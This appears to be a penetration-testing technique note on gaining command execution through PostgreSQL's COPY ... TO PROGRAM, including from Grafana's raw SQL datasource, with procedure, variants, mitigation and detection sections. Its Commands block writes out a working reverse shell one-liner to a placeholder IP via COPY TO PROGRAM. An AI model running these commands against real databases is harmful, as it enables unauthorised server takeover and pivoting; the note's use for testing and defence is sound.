---
topic: PostgreSQL — execution through COPY PROGRAM
tags: [linux, postgresql, grafana, command-execution]
---

# PostgreSQL — execution through COPY PROGRAM

**English** | [🌐 Español](postgres-copy-program.md)

## Concept

`COPY ... FROM PROGRAM` and `COPY ... TO PROGRAM` run a system command with the PostgreSQL user privileges. A panel such as Grafana that allows arbitrary SQL against a PostgreSQL datasource turns a query into command execution on the server.

## When it applies

- Grafana or another panel allows raw SQL queries.
- The datasource uses a superuser or a role with `pg_execute_server_program`.
- PostgreSQL is reachable from the panel or the network.

## Procedure

1. Identify the datasource and test a simple query.
2. Run `COPY ... FROM PROGRAM` with a harmless command.
3. Start a reverse shell or write a file.
4. Use access as `postgres` to pivot.

## Commands

```bash
psql -h 127.0.0.1 -U postgres -d postgres
COPY (SELECT '') TO PROGRAM 'id';
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"';
# From Grafana, use the PostgreSQL datasource and run the same query
```

## Variants

- Write a file with `COPY ... TO '/path'`.
- Use a PL/pgSQL function with `COPY PROGRAM`.
- Abuse an extension or a role with `pg_execute_server_program`.

## Limitations

- Requires a role with execution privileges.
- The command runs as the PostgreSQL service user.
- A container may limit the available tools.

## Mitigation

- Revoke `pg_execute_server_program` and avoid superusers in datasources.
- Disable raw SQL in Grafana.
- Segment PostgreSQL and monitor process children.

## Detection

- `COPY ... PROGRAM` queries in logs.
- Unexpected PostgreSQL child processes.
- Raw queries from visualization panels.

## References

- [PostgreSQL — COPY](https://www.postgresql.org/docs/current/sql-copy.html)
- [0xdf — Jupiter](https://0xdf.gitlab.io/2023/10/21/htb-jupiter.html)
- [CWE-78 — OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
